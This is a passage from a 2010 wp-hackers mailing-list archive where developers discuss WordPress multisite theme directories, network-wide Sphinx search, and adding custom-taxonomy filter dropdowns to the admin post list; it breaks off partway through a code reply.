Message-ID: <8B3A3682-D2D6-4DC8-9806-E1B34713BA5B@thisismyurl.com>

Sorry if this is too off topic for most here but, there was a great article this morning on Boston.com about Drupal (specifically Drupal Garden) which is fairly irrelevant to the group but in the article they make a couple interesting WordPress observations.

First, according to the company behind Drupal Garden (Acquia) WordPress is the platform of choice for 54% of identifiable CMS driven websites and WordPress "is the leading platform for users and developers who want an easy way to get content on the Web."

http://www.boston.com/business/technology/articles/2010/07/22/acquia_aims_to_make_it_easier_to_design_websites/



__

Christopher Ross

Toronto      1 (416) 840-5828
Fredericton 1 (506) 474-2708
New Orleans 1 (504) 322 3485

http://christopherross.ca
http://www.thisismyurl.com


From scribu at gmail.com  Thu Jul 22 15:38:29 2010
From: scribu at gmail.com (scribu)
Date: Thu, 22 Jul 2010 18:38:29 +0300
Subject: [wp-hackers] Boston.com article with interesting WP stats
In-Reply-To: <8B3A3682-D2D6-4DC8-9806-E1B34713BA5B@thisismyurl.com>
References: <8B3A3682-D2D6-4DC8-9806-E1B34713BA5B@thisismyurl.com>
Message-ID: <AANLkTin5E36_np87Zwq-9ZjXF4kSxY6dv5kRnSeUyh3N@mail.gmail.com>

I've made a test site on http://drupalgardens.com and I have to say it's
pretty slick.

I'm sure wp.com could borrow some ideas from there.

-- 
http://scribu.net

From harper.shelby at parivedasolutions.com  Thu Jul 22 15:47:23 2010
From: harper.shelby at parivedasolutions.com (Shelby, Harper)
Date: Thu, 22 Jul 2010 10:47:23 -0500
Subject: [wp-hackers] Filtering Themes visible for a particular network
In-Reply-To: <2BB24BBC87D490418DE901138ACDA0DB42092C9259@srv-exch-02.pariveda.local>
References: <2BB24BBC87D490418DE901138ACDA0DB42092C8893@srv-exch-02.pariveda.local>
	<AANLkTilnSW5FBMRJjHWIWWl_p_V8RSop44dYFEig4_lF@mail.gmail.com>
	<AANLkTinXQ_gXC36KmPRUCR96oqUn-rKrBGNLP308H2rC@mail.gmail.com>
	<2BB24BBC87D490418DE901138ACDA0DB42092C9259@srv-exch-02.pariveda.local>
Message-ID: <2BB24BBC87D490418DE901138ACDA0DB42092C9562@srv-exch-02.pariveda.local>

Problem solved - $current_site wasn't set. I made the bad assumption that it was set prior to the plugin call being made. Swapping get_current_site()->id for $current_site->site_id fixed the issue.

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Shelby, Harper
Sent: Wednesday, July 21, 2010 6:29 PM
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Filtering Themes visible for a particular network

Andrew,
        Thanks for your help. I've successfully moved the themes into site_id-based folders, and they can all be seen, however this appears to have only fixed that part of the problem. As a network admin (OK, I've only tested this with *the* admin, but I had assumed it would still work in that case), I can see all of the themes no matter which network I'm logged in to, and if I enable them in the Super Admin->Themes menu, then the individual sites can see them even if they're not part of that network. Is there anything I'm missing here - I noticed that register_theme_director() just adds to the global $wp_theme_directories - is that the core of the problem, or is it the use of the original site admin login that could cause this?

Thanks,
Harper

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Andrew Nacin
Sent: Tuesday, July 20, 2010 5:17 PM
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Filtering Themes visible for a particular network

On Tue, Jul 20, 2010 at 6:10 PM, Andrew Nacin <wp at andrewnacin.com> wrote:

> On Tue, Jul 20, 2010 at 5:59 PM, Shelby, Harper <
> harper.shelby at parivedasolutions.com> wrote:
>
>> I've been asked to implement theme filtering for a multi-network
>> installation, so that network admins only see those themes which "belong" to
>> them. In the existing installation (on MU 2.9.2), this was done by altering
>> wpmu-themes to check for a Tags value in the theme's CSS file and filtering
>> based on that. I'm trying to move this implementation into a plugin to
>> reduce changes to the core code. Digging into the code, I don't see any
>> action or filter hooks being called in ms-themes.php, so I suspect my best
>> course of action is to move themes into network-specific subdirectories of
>> wp-content/themes, then alter the include path in an admin_init hook to
>> bring in the proper theme directory. Is there a better way to implement
>> this, or are there any potential risks that I haven't seen in this course of
>> action?
>>
>
> You can indeed register theme directories in a plugin. In fact that seems
> like a very sane way of doing this (as long as you don't expect a theme to
> be used across networks).
>

What I meant was, no need for admin_init modifications or anything of the
sort. Check out register_theme_directory(). So you could simply have a
plugin that calls register_theme_directory( WP_CONTENT_DIR .
'/network-themes/' . $current_site->site_id ); and you'd be good to go.

Also, I'd upgrade to 3.0 when you can (perhaps with 3.0.1), there's a decent
number of MU improvements and bug fixes that went into that release.
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

The information transmitted is intended only for the person or entity to which it is addressed and may contain confidential and/or privileged material. Any review, retransmission, dissemination or other use of, or taking of any action in reliance upon, this information by persons or entities other than the intended recipient is prohibited. If you received this in error, please contact the sender and delete the material from any computer.
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From harper.shelby at parivedasolutions.com  Thu Jul 22 16:33:14 2010
From: harper.shelby at parivedasolutions.com (Shelby, Harper)
Date: Thu, 22 Jul 2010 11:33:14 -0500
Subject: [wp-hackers] Filtering Themes visible for a particular network
In-Reply-To: <2BB24BBC87D490418DE901138ACDA0DB42092C9562@srv-exch-02.pariveda.local>
References: <2BB24BBC87D490418DE901138ACDA0DB42092C8893@srv-exch-02.pariveda.local>
	<AANLkTilnSW5FBMRJjHWIWWl_p_V8RSop44dYFEig4_lF@mail.gmail.com>
	<AANLkTinXQ_gXC36KmPRUCR96oqUn-rKrBGNLP308H2rC@mail.gmail.com>
	<2BB24BBC87D490418DE901138ACDA0DB42092C9259@srv-exch-02.pariveda.local>
	<2BB24BBC87D490418DE901138ACDA0DB42092C9562@srv-exch-02.pariveda.local>
Message-ID: <2BB24BBC87D490418DE901138ACDA0DB42093A1A59@srv-exch-02.pariveda.local>

Additional followup:

	Changing the code Andrew originally posted to:

<?php
    global $current_site;
    register_theme_directory(WP_CONTENT_DIR.'/network-themes/'.$current_site->id);
?>

Works as well.

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Shelby, Harper
Sent: Thursday, July 22, 2010 10:47 AM
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Filtering Themes visible for a particular network

Problem solved - $current_site wasn't set. I made the bad assumption that it was set prior to the plugin call being made. Swapping get_current_site()->id for $current_site->site_id fixed the issue.

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Shelby, Harper
Sent: Wednesday, July 21, 2010 6:29 PM
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Filtering Themes visible for a particular network

Andrew,
        Thanks for your help. I've successfully moved the themes into site_id-based folders, and they can all be seen, however this appears to have only fixed that part of the problem. As a network admin (OK, I've only tested this with *the* admin, but I had assumed it would still work in that case), I can see all of the themes no matter which network I'm logged in to, and if I enable them in the Super Admin->Themes menu, then the individual sites can see them even if they're not part of that network. Is there anything I'm missing here - I noticed that register_theme_director() just adds to the global $wp_theme_directories - is that the core of the problem, or is it the use of the original site admin login that could cause this?

Thanks,
Harper

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Andrew Nacin
Sent: Tuesday, July 20, 2010 5:17 PM
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Filtering Themes visible for a particular network

On Tue, Jul 20, 2010 at 6:10 PM, Andrew Nacin <wp at andrewnacin.com> wrote:

> On Tue, Jul 20, 2010 at 5:59 PM, Shelby, Harper <
> harper.shelby at parivedasolutions.com> wrote:
>
>> I've been asked to implement theme filtering for a multi-network
>> installation, so that network admins only see those themes which "belong" to
>> them. In the existing installation (on MU 2.9.2), this was done by altering
>> wpmu-themes to check for a Tags value in the theme's CSS file and filtering
>> based on that. I'm trying to move this implementation into a plugin to
>> reduce changes to the core code. Digging into the code, I don't see any
>> action or filter hooks being called in ms-themes.php, so I suspect my best
>> course of action is to move themes into network-specific subdirectories of
>> wp-content/themes, then alter the include path in an admin_init hook to
>> bring in the proper theme directory. Is there a better way to implement
>> this, or are there any potential risks that I haven't seen in this course of
>> action?
>>
>
> You can indeed register theme directories in a plugin. In fact that seems
> like a very sane way of doing this (as long as you don't expect a theme to
> be used across networks).
>

What I meant was, no need for admin_init modifications or anything of the
sort. Check out register_theme_directory(). So you could simply have a
plugin that calls register_theme_directory( WP_CONTENT_DIR .
'/network-themes/' . $current_site->site_id ); and you'd be good to go.

Also, I'd upgrade to 3.0 when you can (perhaps with 3.0.1), there's a decent
number of MU improvements and bug fixes that went into that release.
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

The information transmitted is intended only for the person or entity to which it is addressed and may contain confidential and/or privileged material. Any review, retransmission, dissemination or other use of, or taking of any action in reliance upon, this information by persons or entities other than the intended recipient is prohibited. If you received this in error, please contact the sender and delete the material from any computer.
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From otto at ottodestruct.com  Thu Jul 22 18:38:08 2010
From: otto at ottodestruct.com (Otto)
Date: Thu, 22 Jul 2010 13:38:08 -0500
Subject: [wp-hackers] Searching across entire multisite network with
	Sphinx
In-Reply-To: <F51FE440-2520-47DF-8108-E87BBC8050DE@gmail.com>
References: <F51FE440-2520-47DF-8108-E87BBC8050DE@gmail.com>
Message-ID: <AANLkTilG6pGx7X98ROJMsfXtvbAmYtZIzIxn2yQOHwpD@mail.gmail.com>

Your basic problem is that you can't do wildcards in a table name. And
since each site has its own set of tables, this is a problem for
pulling in their data. The only real solution is to first have it pull
the list of tables using SHOW TABLES or similar, then loop through
those to build your table names outside of SQL.

I am not familiar with Sphinx, and so I can't tell you how to do that exactly.

One approach might be to make a combined View of all your post tables
so that Sphinx can access them all as if they were one table.

-Otto



On Wed, Jul 21, 2010 at 11:31 AM, Daniel Bachhuber
<danielbachhuber at gmail.com> wrote:
> Hey all,
> I'm in the process of setting up a new WordPress 3.0 multisite instance and would like to have search on the main site query across all of the sites in the network.
>
> Initially, my thought was to use Sphinx, and the WP Sphinx Search plugin, but I've run into a significant issue in that I can't dynamically add new sites to the mix. It's detailed more in depth here:
>
> http://stackoverflow.com/questions/3301145/configuring-sphinx-to-index-a-dynamic-set-of-tables
>
> My question for the WordPress crowd, however, is this: is there a better way to offer search across all of the sites on the network?
>
> Ideally, this would be a self-hosted solution that I could performance tune, also supported the different BuddyPress content types (members, groups, activity updates, etc.), and was agnostic about custom domain mapping as some sites will be a subdomain of the primary site while others will be on their own domain.
>
> Thanks much in advance,
>
> Daniel
>
> --
> Daniel Bachhuber
> danielbachhuber.com
> danielbachhuber at gmail.com
> +1 (971) 998-5407
> aim/skype/twitter: danielbachhuber
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From jimmy.roy at gmail.com  Fri Jul 23 03:59:18 2010
From: jimmy.roy at gmail.com (Jimmy Roy)
Date: Fri, 23 Jul 2010 11:59:18 +0800
Subject: [wp-hackers] Custom Post Type in Admin,
	filter by new custom Taxonomies
Message-ID: <AANLkTinDtt9tMrVLU0Jxd0vEYUYviw-88AtwaCIM3_q4@mail.gmail.com>

hi all,
I've create a custom post type (Ressource) and a custom taxomomies,
everything works well but it miss something in the admin, in regular Post
Type, when I list all the Post in admin I can filter by categories, but I
dont have this select box in my custom post type page (the pas wich list all
my Ressource post).
is it possible to get it ?

Jimmy

From scribu at gmail.com  Fri Jul 23 06:27:56 2010
From: scribu at gmail.com (scribu)
Date: Fri, 23 Jul 2010 09:27:56 +0300
Subject: [wp-hackers] Custom Post Type in Admin,
	filter by new custom 	Taxonomies
In-Reply-To: <AANLkTinDtt9tMrVLU0Jxd0vEYUYviw-88AtwaCIM3_q4@mail.gmail.com>
References: <AANLkTinDtt9tMrVLU0Jxd0vEYUYviw-88AtwaCIM3_q4@mail.gmail.com>
Message-ID: <AANLkTikJCbyEb461CNkPVg9YKC9nwCZ44HVMIGVm5Y9F@mail.gmail.com>

On Fri, Jul 23, 2010 at 6:59 AM, Jimmy Roy <jimmy.roy at gmail.com> wrote:

> hi all,
> I've create a custom post type (Ressource) and a custom taxomomies,
> everything works well but it miss something in the admin, in regular Post
> Type, when I list all the Post in admin I can filter by categories, but I
> dont have this select box in my custom post type page (the pas wich list
> all
> my Ressource post).
> is it possible to get it ?
>

Yes, it's possible, but you'll have to output it in the footer and then use
jQuery to place it above the table.


-- 
http://scribu.net

From jimmy.roy at gmail.com  Fri Jul 23 06:35:26 2010
From: jimmy.roy at gmail.com (Jimmy Roy)
Date: Fri, 23 Jul 2010 14:35:26 +0800
Subject: [wp-hackers] Custom Post Type in Admin,
	filter by new custom 	Taxonomies
In-Reply-To: <AANLkTikJCbyEb461CNkPVg9YKC9nwCZ44HVMIGVm5Y9F@mail.gmail.com>
References: <AANLkTinDtt9tMrVLU0Jxd0vEYUYviw-88AtwaCIM3_q4@mail.gmail.com>
	<AANLkTikJCbyEb461CNkPVg9YKC9nwCZ44HVMIGVm5Y9F@mail.gmail.com>
Message-ID: <AANLkTimVYzMUfv0LPpYnPgnfsz9_UaWdzMp8fm9iEkW4@mail.gmail.com>

I see, thank you for this idea.
I don't understand why it's not standard.

Jimmy


2010/7/23 scribu <scribu at gmail.com>

> On Fri, Jul 23, 2010 at 6:59 AM, Jimmy Roy <jimmy.roy at gmail.com> wrote:
>
> > hi all,
> > I've create a custom post type (Ressource) and a custom taxomomies,
> > everything works well but it miss something in the admin, in regular Post
> > Type, when I list all the Post in admin I can filter by categories, but I
> > dont have this select box in my custom post type page (the pas wich list
> > all
> > my Ressource post).
> > is it possible to get it ?
> >
>
> Yes, it's possible, but you'll have to output it in the footer and then use
> jQuery to place it above the table.
>
>
> --
> http://scribu.net
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mikeschinkel at newclarity.net  Fri Jul 23 06:45:36 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Fri, 23 Jul 2010 02:45:36 -0400
Subject: [wp-hackers] Custom Post Type in Admin,
	filter by new custom 	Taxonomies
In-Reply-To: <AANLkTimVYzMUfv0LPpYnPgnfsz9_UaWdzMp8fm9iEkW4@mail.gmail.com>
References: <AANLkTinDtt9tMrVLU0Jxd0vEYUYviw-88AtwaCIM3_q4@mail.gmail.com>
	<AANLkTikJCbyEb461CNkPVg9YKC9nwCZ44HVMIGVm5Y9F@mail.gmail.com>
	<AANLkTimVYzMUfv0LPpYnPgnfsz9_UaWdzMp8fm9iEkW4@mail.gmail.com>
Message-ID: <75E9AFF5-9953-40A1-872D-CB7685E7D4BD@newclarity.net>

> 2010/7/23 scribu <scribu at gmail.com>

>> On Fri, Jul 23, 2010 at 6:59 AM, Jimmy Roy <jimmy.roy at gmail.com> wrote:
>> 
>>> hi all,
>>> I've create a custom post type (Ressource) and a custom taxomomies,
>>> everything works well but it miss something in the admin, in regular Post
>>> Type, when I list all the Post in admin I can filter by categories, but I
>>> dont have this select box in my custom post type page (the pas wich list
>>> all
>>> my Ressource post).
>>> is it possible to get it ?
>>> 
>> 
>> Yes, it's possible, but you'll have to output it in the footer and then use
>> jQuery to place it above the table.

Are you sure?  Unless I misunderstand what Jimmy is asking I think it can be done in the "restrict_manage_posts" hook.  Jimmy, try this in your theme's functions.php file changing the name of the post type and the name of the taxonomy (let us know if this is what you need or not):

  	 	add_action('restrict_manage_posts','my_restrict_manage_posts'); 

		function my_restrict_manage_posts() {
			global $typenow; 
			if ($typenow=='your_custom_type')
				echo get_taxonomy_html_select('your_taxonomy');
		}

		function get_taxonomy_html_select($taxonomy_name) {
			$taxonomy = get_taxonomy($taxonomy_name);
			$terms = get_terms($taxonomy_name);
			$label = __("Show All {$taxonomy->label}");
			$html = array();
			$html[] = "<select id=\"$taxonomy_name\" name=\"$taxonomy_name\">";
			$html[] = "<option value=\"0\">$label</option>";
			$this_term = $_GET[$taxonomy_name];
			foreach($terms as $term) {
				$default = ($this_term==$term->term_id ? ' selected="selected"' : '');
				$value = esc_attr($term->name);
				$html[] = "<option value=\"{$term->term_id}\"$default>$value</option>";
			}
			$html[] = "</select>";
			return implode("\n",$html);
		}


> I don't understand why it's not standard.

(In my opinion) it's because WordPress like any (open-source) software is alway in an evolution.  WordPress has just evolved to have Custom Post Types but it will take time to identify all the important related core and usage patterns and have them applied to WordPress core.

-Mike


From scribu at gmail.com  Fri Jul 23 07:35:52 2010
From: scribu at gmail.com (scribu)
Date: Fri, 23 Jul 2010 10:35:52 +0300
Subject: [wp-hackers] Custom Post Type in Admin,
	filter by new custom 	Taxonomies
In-Reply-To: <75E9AFF5-9953-40A1-872D-CB7685E7D4BD@newclarity.net>
References: <AANLkTinDtt9tMrVLU0Jxd0vEYUYviw-88AtwaCIM3_q4@mail.gmail.com>
	<AANLkTikJCbyEb461CNkPVg9YKC9nwCZ44HVMIGVm5Y9F@mail.gmail.com>
	<AANLkTimVYzMUfv0LPpYnPgnfsz9_UaWdzMp8fm9iEkW4@mail.gmail.com>
	<75E9AFF5-9953-40A1-872D-CB7685E7D4BD@newclarity.net>
Message-ID: <AANLkTinDBIEpzplIZC9qvZCgk3i1PDmaudTbOOay_2d5@mail.gmail.com>

On Fri, Jul 23, 2010 at 9:45 AM, Mike Schinkel
<mikeschinkel at newclarity.net>wrote:

> >> Yes, it's possible, but you'll have to output it in the footer and then
> use
> >> jQuery to place it above the table.
>
> Are you sure?  Unless I misunderstand what Jimmy is asking I think it can
> be done in the "restrict_manage_posts" hook.


Indeed. Also, he can use wp_dropdown_categories() instead of creating the
select manually.


> I don't understand why it's not standard.
>

Because a custom post type can have multiple custom taxonomies associated
with it and you might want 0, 1, or more of them to appear as dropdowns.
Thus the hook, which gives you a lot of flexibility.


-- 
http://scribu.net

From mikeschinkel at newclarity.net  Fri Jul 23 07:45:02 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Fri, 23 Jul 2010 03:45:02 -0400
Subject: [wp-hackers] Custom Post Type in Admin,
	filter by new custom 	Taxonomies
In-Reply-To: <AANLkTinDBIEpzplIZC9qvZCgk3i1PDmaudTbOOay_2d5@mail.gmail.com>
References: <AANLkTinDtt9tMrVLU0Jxd0vEYUYviw-88AtwaCIM3_q4@mail.gmail.com>
	<AANLkTikJCbyEb461CNkPVg9YKC9nwCZ44HVMIGVm5Y9F@mail.gmail.com>
	<AANLkTimVYzMUfv0LPpYnPgnfsz9_UaWdzMp8fm9iEkW4@mail.gmail.com>
	<75E9AFF5-9953-40A1-872D-CB7685E7D4BD@newclarity.net>
	<AANLkTinDBIEpzplIZC9qvZCgk3i1PDmaudTbOOay_2d5@mail.gmail.com>
Message-ID: <030E4B32-6EA0-4991-B92F-6CEEF847725C@newclarity.net>

On Jul 23, 2010, at 3:35 AM, scribu wrote:
>> Are you sure?  Unless I misunderstand what Jimmy is asking I think it can
>> be done in the "restrict_manage_posts" hook.
> 
> Indeed. Also, he can use wp_dropdown_categories() instead of creating the
> select manually.

Thanks. :)

No matter how hard I try, I can't keep track of every function in the library!  Maybe the new 3.org will help.

-Mike

From jimmy.roy at gmail.com  Fri Jul 23 08:01:54 2010
From: jimmy.roy at gmail.com (Jimmy Roy)
Date: Fri, 23 Jul 2010 16:01:54 +0800
Subject: [wp-hackers] Custom Post Type in Admin,
	filter by new custom 	Taxonomies
In-Reply-To: <030E4B32-6EA0-4991-B92F-6CEEF847725C@newclarity.net>
References: <AANLkTinDtt9tMrVLU0Jxd0vEYUYviw-88AtwaCIM3_q4@mail.gmail.com>
	<AANLkTikJCbyEb461CNkPVg9YKC9nwCZ44HVMIGVm5Y9F@mail.gmail.com>
	<AANLkTimVYzMUfv0LPpYnPgnfsz9_UaWdzMp8fm9iEkW4@mail.gmail.com>
	<75E9AFF5-9953-40A1-872D-CB7685E7D4BD@newclarity.net>
	<AANLkTinDBIEpzplIZC9qvZCgk3i1PDmaudTbOOay_2d5@mail.gmail.com>
	<030E4B32-6EA0-4991-B92F-6CEEF847725C@newclarity.net>
Message-ID: <AANLkTin_UglTEsVsqQ623jQSOVAQG3wcyAJlaCZmHtm0@mail.gmail.com>

thank u Mike and Scribu, I wrote a mix of your solutions :

add_action( 'restrict_manage_posts', 'my_restrict_manage_posts' );

function my_restrict_manage_posts() {
global $typenow;
if ($typenow=='ressource_fr')
wp_dropdown_categories( 'show_option_all=Afficher
tout&show_count=1&hierarchical=1&taxonomy=classement_fr');
}

but when I click on 'filter' the result is always ... "no result".

Jimmy


2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>

> On Jul 23, 2010, at 3:35 AM, scribu wrote:
> >> Are you sure?  Unless I misunderstand what Jimmy is asking I think it
> can
> >> be done in the "restrict_manage_posts" hook.
> >
> > Indeed. Also, he can use wp_dropdown_categories() instead of creating the
> > select manually.
>
> Thanks. :)
>
> No matter how hard I try, I can't keep track of every function in the
> library!  Maybe the new 3.org will help.
>
> -Mike
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From jimmy.roy at gmail.com  Fri Jul 23 08:23:22 2010
From: jimmy.roy at gmail.com (Jimmy Roy)
Date: Fri, 23 Jul 2010 16:23:22 +0800
Subject: [wp-hackers] Custom Post Type in Admin,
	filter by new custom 	Taxonomies
In-Reply-To: <AANLkTin_UglTEsVsqQ623jQSOVAQG3wcyAJlaCZmHtm0@mail.gmail.com>
References: <AANLkTinDtt9tMrVLU0Jxd0vEYUYviw-88AtwaCIM3_q4@mail.gmail.com>
	<AANLkTikJCbyEb461CNkPVg9YKC9nwCZ44HVMIGVm5Y9F@mail.gmail.com>
	<AANLkTimVYzMUfv0LPpYnPgnfsz9_UaWdzMp8fm9iEkW4@mail.gmail.com>
	<75E9AFF5-9953-40A1-872D-CB7685E7D4BD@newclarity.net>
	<AANLkTinDBIEpzplIZC9qvZCgk3i1PDmaudTbOOay_2d5@mail.gmail.com>
	<030E4B32-6EA0-4991-B92F-6CEEF847725C@newclarity.net>
	<AANLkTin_UglTEsVsqQ623jQSOVAQG3wcyAJlaCZmHtm0@mail.gmail.com>
Message-ID: <AANLkTi=eN2MrRMTkhS9P_amg9v5jresAHv8oNSB7mj1x@mail.gmail.com>

the generated code is :

<select class="postform" id="cat" name="classement-fr">
<option selected="selected" value="0">Afficher tout</option>
<option value="5" class="level-0">Langue oral&nbsp;&nbsp;(4)</option>
<option value="6" class="level-1">&nbsp;&nbsp;&nbsp;Niveau
1&nbsp;&nbsp;(2)</option>
<option value="7" class="level-1">&nbsp;&nbsp;&nbsp;Niveau
2&nbsp;&nbsp;(1)</option>
<option value="8" class="level-1">&nbsp;&nbsp;&nbsp;Niveau
3&nbsp;&nbsp;(1)</option>
</select>

the id is "cat", like if a regular category, so I add the name parameter
in wp_dropdown_categories and assign to this parameter the query_var value
of the custom taxonomy :

wp_dropdown_categories( 'show_option_all=Afficher
tout&show_count=1&hierarchical=1&taxonomy=classement_fr&name=classement-fr');

now when I click on filter... the result is always all my ressources !


--
Jimmy | www.jimmyroy.fr
--



2010/7/23 Jimmy Roy <jimmy.roy at gmail.com>

> thank u Mike and Scribu, I wrote a mix of your solutions :
>
> add_action( 'restrict_manage_posts', 'my_restrict_manage_posts' );
>
> function my_restrict_manage_posts() {
>  global $typenow;
> if ($typenow=='ressource_fr')
> wp_dropdown_categories( 'show_option_all=Afficher
> tout&show_count=1&hierarchical=1&taxonomy=classement_fr');
> }
>
> but when I click on 'filter' the result is always ... "no result".
>
> Jimmy
>
>
> 2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>
>
> On Jul 23, 2010, at 3:35 AM, scribu wrote:
>> >> Are you sure?  Unless I misunderstand what Jimmy is asking I think it
>> can
>> >> be done in the "restrict_manage_posts" hook.
>> >
>> > Indeed. Also, he can use wp_dropdown_categories() instead of creating
>> the
>> > select manually.
>>
>> Thanks. :)
>>
>> No matter how hard I try, I can't keep track of every function in the
>> library!  Maybe the new 3.org will help.
>>
>> -Mike
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>
>

From jimmy.roy at gmail.com  Fri Jul 23 08:24:30 2010
From: jimmy.roy at gmail.com (Jimmy Roy)
Date: Fri, 23 Jul 2010 16:24:30 +0800
Subject: [wp-hackers] Custom Post Type in Admin,
	filter by new custom 	Taxonomies
In-Reply-To: <AANLkTi=eN2MrRMTkhS9P_amg9v5jresAHv8oNSB7mj1x@mail.gmail.com>
References: <AANLkTinDtt9tMrVLU0Jxd0vEYUYviw-88AtwaCIM3_q4@mail.gmail.com>
	<AANLkTikJCbyEb461CNkPVg9YKC9nwCZ44HVMIGVm5Y9F@mail.gmail.com>
	<AANLkTimVYzMUfv0LPpYnPgnfsz9_UaWdzMp8fm9iEkW4@mail.gmail.com>
	<75E9AFF5-9953-40A1-872D-CB7685E7D4BD@newclarity.net>
	<AANLkTinDBIEpzplIZC9qvZCgk3i1PDmaudTbOOay_2d5@mail.gmail.com>
	<030E4B32-6EA0-4991-B92F-6CEEF847725C@newclarity.net>
	<AANLkTin_UglTEsVsqQ623jQSOVAQG3wcyAJlaCZmHtm0@mail.gmail.com>
	<AANLkTi=eN2MrRMTkhS9P_amg9v5jresAHv8oNSB7mj1x@mail.gmail.com>
Message-ID: <AANLkTi=mascEJuCGo1na2bm3f_M8ZRsBnMVT52tj09eF@mail.gmail.com>

finally no... the result is still the same, when I click on filter : "no
result".

Jimmy


2010/7/23 Jimmy Roy <jimmy.roy at gmail.com>

> the generated code is :
>
> <select class="postform" id="cat" name="classement-fr">
> <option selected="selected" value="0">Afficher tout</option>
>  <option value="5" class="level-0">Langue oral&nbsp;&nbsp;(4)</option>
> <option value="6" class="level-1">&nbsp;&nbsp;&nbsp;Niveau
> 1&nbsp;&nbsp;(2)</option>
>  <option value="7" class="level-1">&nbsp;&nbsp;&nbsp;Niveau
> 2&nbsp;&nbsp;(1)</option>
> <option value="8" class="level-1">&nbsp;&nbsp;&nbsp;Niveau
> 3&nbsp;&nbsp;(1)</option>
> </select>
>
> the id is "cat", like if a regular category, so I add the name parameter
> in wp_dropdown_categories and assign to this parameter the query_var value
> of the custom taxonomy :
>
> wp_dropdown_categories( 'show_option_all=Afficher
> tout&show_count=1&hierarchical=1&taxonomy=classement_fr&name=classement-fr');
>
> now when I click on filter... the result is always all my ressources !
>
>
> --
> Jimmy | www.jimmyroy.fr
> --
>
>
>
> 2010/7/23 Jimmy Roy <jimmy.roy at gmail.com>
>
> thank u Mike and Scribu, I wrote a mix of your solutions :
>>
>> add_action( 'restrict_manage_posts', 'my_restrict_manage_posts' );
>>
>> function my_restrict_manage_posts() {
>>  global $typenow;
>> if ($typenow=='ressource_fr')
>> wp_dropdown_categories( 'show_option_all=Afficher
>> tout&show_count=1&hierarchical=1&taxonomy=classement_fr');
>> }
>>
>> but when I click on 'filter' the result is always ... "no result".
>>
>> Jimmy
>>
>>
>> 2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>
>>
>> On Jul 23, 2010, at 3:35 AM, scribu wrote:
>>> >> Are you sure?  Unless I misunderstand what Jimmy is asking I think it
>>> can
>>> >> be done in the "restrict_manage_posts" hook.
>>> >
>>> > Indeed. Also, he can use wp_dropdown_categories() instead of creating
>>> the
>>> > select manually.
>>>
>>> Thanks. :)
>>>
>>> No matter how hard I try, I can't keep track of every function in the
>>> library!  Maybe the new 3.org will help.
>>>
>>> -Mike
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>
>>
>>
>

From mikeschinkel at newclarity.net  Fri Jul 23 08:46:13 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Fri, 23 Jul 2010 04:46:13 -0400
Subject: [wp-hackers] Custom Post Type in Admin,
	filter by new custom 	Taxonomies
In-Reply-To: <AANLkTi=mascEJuCGo1na2bm3f_M8ZRsBnMVT52tj09eF@mail.gmail.com>
References: <AANLkTinDtt9tMrVLU0Jxd0vEYUYviw-88AtwaCIM3_q4@mail.gmail.com>
	<AANLkTikJCbyEb461CNkPVg9YKC9nwCZ44HVMIGVm5Y9F@mail.gmail.com>
	<AANLkTimVYzMUfv0LPpYnPgnfsz9_UaWdzMp8fm9iEkW4@mail.gmail.com>
	<75E9AFF5-9953-40A1-872D-CB7685E7D4BD@newclarity.net>
	<AANLkTinDBIEpzplIZC9qvZCgk3i1PDmaudTbOOay_2d5@mail.gmail.com>
	<030E4B32-6EA0-4991-B92F-6CEEF847725C@newclarity.net>
	<AANLkTin_UglTEsVsqQ623jQSOVAQG3wcyAJlaCZmHtm0@mail.gmail.com>
	<AANLkTi=eN2MrRMTkhS9P_amg9v5jresAHv8oNSB7mj1x@mail.gmail.com>
	<AANLkTi=mascEJuCGo1na2bm3f_M8ZRsBnMVT52tj09eF@mail.gmail.com>
Message-ID: <C8A042B8-A7EC-428B-929C-C23D13D06B6A@newclarity.net>

Sorry, I forgot there's something else needed in your use-case.  Try adding this (I think it will work):

add_action( 'request', 'my_request' );
function my_request($request) {
